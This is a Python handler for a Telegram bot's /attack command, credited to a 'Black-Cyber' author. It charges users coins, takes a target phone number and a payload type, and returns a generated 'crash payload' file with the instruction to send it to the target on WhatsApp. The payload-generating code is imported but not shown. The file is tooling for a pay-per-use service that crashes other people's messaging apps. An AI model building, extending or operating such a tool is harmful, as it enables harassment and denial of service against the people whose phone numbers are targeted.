#!/usr/bin/env python3
# Attack Commands
# Author: HeaNg[Black-Cyber]

import os
import time
from telegram import Update, ParseMode
from telegram.ext import ContextTypes

from config import COST_PER_CRASH
from database import get_user, remove_coins, log_crash
from payloads import generate_payload

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack command with coin deduction"""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        await update.message.reply_text("❌ You need to /start first!")
        return
    
    if user[7]:  # is_banned
        await update.message.reply_text("🚫 You are banned from using this bot!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ **Usage:** /attack <phone> <type>\n"
            "📌 **Types:** text, vcard, location, media\n"
            f"💀 **Cost:** {COST_PER_CRASH} coins\n\n"
            "📱 **Example:** /attack 1234567890 text"
        )
        return
    
    # Check coins
    if user[3] < COST_PER_CRASH:
        await update.message.reply_text(
            f"❌ Not enough coins!\n"
            f"💰 Need: {COST_PER_CRASH} coins\n"
            f"🪙 You have: {user[3]} coins\n"
            f"💡 Use /daily or /referral to earn more!"
        )
        return
    
    phone = args[0]
    payload_type = args[1].lower()
    
    if payload_type not in ["text", "vcard", "location", "media"]:
        await update.message.reply_text("❌ Invalid type. Choose: text, vcard, location, media")
        return
    
    # Send processing message
    status_msg = await update.message.reply_text(
        f"⏳ Generating {payload_type} payload for {phone}...\n"
        f"💰 Cost: {COST_PER_CRASH} coins"
    )
    
    # Deduct coins
    if remove_coins(user_id, COST_PER_CRASH, f"Crash attack on {phone} with {payload_type}"):
        # Generate payload
        filename = generate_payload(payload_type, phone)
        
        if not filename:
            await status_msg.edit_text("❌ Failed to generate payload!")
            return
        
        # Log crash
        log_crash(user_id, phone, payload_type)
        
        # Send success message
        await status_msg.edit_text(
            f"💀 **ATTACK GENERATED!**\n\n"
            f"📱 Target: `{phone}`\n"
            f"💀 Payload: {payload_type.upper()}\n"
            f"💰 Cost: {COST_PER_CRASH} coins\n"
            f"🪙 Remaining: {get_user(user_id)[3]} coins\n\n"
            f"📄 **File:** `{os.path.basename(filename)}`\n\n"
            f"⚠️ **Send this file to the target on WhatsApp!**",
            parse_mode='Markdown'
        )
        
        # Send the file
        with open(filename, 'rb') as f:
            await update.message.reply_document(
                document=f, 
                filename=os.path.basename(filename),
                caption=f"💀 Crash payload for {phone}\nType: {payload_type.upper()}"
            )
        
        # Clean up
        os.remove(filename)
        
    else:
        await status_msg.edit_text("❌ Failed to process attack! Please try again.")